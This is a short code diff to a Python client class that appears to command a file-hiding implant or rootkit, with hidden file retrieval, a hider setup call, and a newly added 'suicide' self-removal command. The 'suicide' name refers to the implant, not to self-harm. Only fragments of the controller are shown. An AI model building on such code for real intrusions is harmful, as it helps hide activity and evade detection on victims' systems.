@@ -39,7 +39,7 @@ class Agent:
 
     def retrieve_file(self, fileName) -> tuple[Responce, bytes]:
         with self.connect() as conn:
-            conn.send_data(
+            conn.send_command(
                 Command(
                     0,
                     FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_RETREIVE_FILE,
@@ -81,13 +81,9 @@ class Agent:
             )
             conn.send_data(fileContent)
             results = list()
-            print(f"{results=}")
             results.append(conn.recv_responce_struct())
-            print(f"{results=}")
             results.append(conn.recv_responce_struct())
-            print(f"{results=}")
             results.append(conn.recv_responce_struct())
-            print(f"{results=}")
             return conn.recv_full_responce(), results
 
     # prob redundant in future
@@ -95,3 +91,10 @@ class Agent:
         with self.connect() as conn:
             conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, hiderPath))
             return conn.recv_responce_struct()
+
+    def suicide(self):
+        with self.connect() as conn:
+            conn.send_command(Command(0, FunCode.SUICIDE, 0, ""))
+            res = conn.recv_responce_struct()
+            assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
+            return res
